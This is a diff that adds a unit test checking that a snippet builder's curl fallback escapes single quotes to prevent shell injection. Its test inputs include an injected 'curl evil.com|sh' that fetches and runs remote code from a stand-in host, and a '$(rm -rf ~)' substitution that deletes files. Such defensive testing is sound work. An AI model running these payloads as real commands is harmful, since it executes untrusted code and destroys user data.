@@ -61,6 +61,23 @@ describe("buildSnippet", () => {
     expect(result).toContain("https://api.test/items")
   })
 
+  it("escapes single quotes in the curl fallback to prevent shell injection", async () => {
+    // A relative URL makes httpsnippet-lite throw (new URL fails), exercising the
+    // hand-rolled curl fallback that must POSIX-escape every interpolation.
+    const result = await buildSnippet(
+      "POST",
+      "/users",
+      { "X-Evil": "x'; curl evil.com|sh; '" },
+      `{"a":"'$(rm -rf ~)'"}`,
+      "shell-curl",
+    )
+    expect(result).toContain("curl")
+    // The raw quote-breaking sequence must not survive unescaped.
+    expect(result).not.toContain("x'; curl evil.com|sh; '")
+    // POSIX single-quote escaping ('\'') must be present.
+    expect(result).toContain("'\\''")
+  })
+
   it("SNIPPET_TARGETS contains expected entries", () => {
     const ids = SNIPPET_TARGETS.map(t => t.id)
     expect(ids).toContain("shell-curl")
